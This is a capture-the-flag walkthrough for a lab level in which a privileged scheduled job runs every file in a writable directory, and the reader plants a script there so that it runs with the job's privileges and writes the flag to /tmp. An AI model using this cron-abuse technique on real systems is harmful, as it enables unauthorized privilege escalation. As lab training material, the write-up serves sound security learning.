# Level 05

**Exploit:** Abuse of a privileged cron job

The scheduled job runs files from a writable directory, allowing a script we create to run with the job's privileges.

## Walkthrough

Locate the helper that runs the scheduled tasks:

```bash
find . / -user flag05
```

Output:

```text
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```bash
cat /usr/sbin/openarenaserver
```

Output:

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

The helper runs every file in `/opt/openarenaserver` and removes it afterward. Create a script in that directory that writes the `getflag` output to a file, since cron output is not available in the terminal:

```bash
touch /opt/openarenaserver/script.sh
```

The script contents are:

```sh
getflag > /tmp/flag
```

```bash
chmod +x /opt/openarenaserver/script.sh
```

Wait for the next scheduled run, then check `/tmp/flag` for the result.

